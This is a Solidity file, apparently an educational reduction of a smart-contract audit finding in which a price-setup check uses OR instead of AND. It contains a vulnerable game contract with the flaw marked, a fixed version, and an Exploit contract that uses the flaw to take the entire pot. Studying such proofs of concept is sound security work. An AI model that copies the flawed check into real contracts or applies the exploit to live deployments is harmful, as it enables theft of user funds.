// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Xyro Setup — stop and target may sit on the same side of the start
    (Zokyo, finding #45670)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: createSetup requires stop OR target to be on the correct
    side. A long with stop 15 and target 20 passes because only the target
    check is true. A rising price hits 15 before 20, so stop voters take the pot. */

contract VoteToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract SetupGame {
    uint256 public startingPrice = 10 * 1e14;
    bool public isLong;
    uint256 public stopLossPrice;
    uint256 public takeProfitPrice;
    bool public created;
    bool public slWon;
    uint256 public paid;
    uint256 public slPot;
    uint256 public tpPot;
    address public slVoter;
    address public tpVoter;
    VoteToken public token;

    constructor(VoteToken token_) {
        token = token_;
    }

    function createSetup(bool isLong_, uint256 takeProfit, uint256 stopLoss) external {
        isLong = isLong_;
        takeProfitPrice = takeProfit;
        stopLossPrice = stopLoss;
        if (isLong_) {
            bool stopBelow = uint192(startingPrice) / 1e14 > stopLossPrice;
            bool targetAbove = uint192(startingPrice) / 1e14 < takeProfitPrice;
            bool accepted = stopBelow || targetAbove; // @> VULN: OR accepts a long whose stop is above the start
            // FIX: accepted = stopBelow && targetAbove
            require(accepted, "Wrong tp or sl price");
        } else {
            bool stopAbove = uint192(startingPrice) / 1e14 < stopLossPrice;
            bool targetBelow = uint192(startingPrice) / 1e14 > takeProfitPrice;
            require(stopAbove || targetBelow, "Wrong tp or sl price");
        }
        created = true;
    }

    function vote(bool stopSide, address voter, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        if (stopSide) {
            slPot += amount;
            slVoter = voter;
        } else {
            tpPot += amount;
            tpVoter = voter;
        }
    }

    function resolve(uint256 endPrice) external {
        uint256 start = uint192(startingPrice) / 1e14;
        bool stopHitFirst = isLong && stopLossPrice > start && stopLossPrice <= endPrice && stopLossPrice < takeProfitPrice;
        slWon = stopHitFirst;
        uint256 pot = slPot + tpPot;
        address winner = stopHitFirst ? slVoter : tpVoter;
        slPot = 0;
        tpPot = 0;
        token.transfer(winner, pot);
        paid = pot;
    }
}

contract SetupGameFixed {
    uint256 public startingPrice = 10 * 1e14;

    function createSetup(bool isLong, uint256 takeProfitPrice, uint256 stopLossPrice) external view {
        uint256 start = uint192(startingPrice) / 1e14;
        if (isLong) {
            require(start > stopLossPrice && start < takeProfitPrice, "Wrong tp or sl price");
        } else {
            require(start < stopLossPrice && start > takeProfitPrice, "Wrong tp or sl price");
        }
    }
}

contract Exploit {
    VoteToken public token;
    SetupGame public game;
    bool public created;
    bool public slWon;
    uint256 public paid;

    constructor() {
        token = new VoteToken();
        game = new SetupGame(token);
        token.mint(address(this), 200 ether);
    }

    function run() external {
        address attacker = msg.sender;
        game.createSetup(true, 20, 15);
        created = game.created();
        token.approve(address(game), 200 ether);
        game.vote(false, address(this), 100 ether);
        game.vote(true, attacker, 100 ether);
        game.resolve(25);
        slWon = game.slWon();
        paid = game.paid();
        require(created, "setup");
        require(slWon, "stop won");
        require(paid == 200 ether, "pot");
        require(token.balanceOf(attacker) == 200 ether, "attacker pot");
        require(token.balanceOf(address(this)) == 0, "tp stake gone");
    }
}
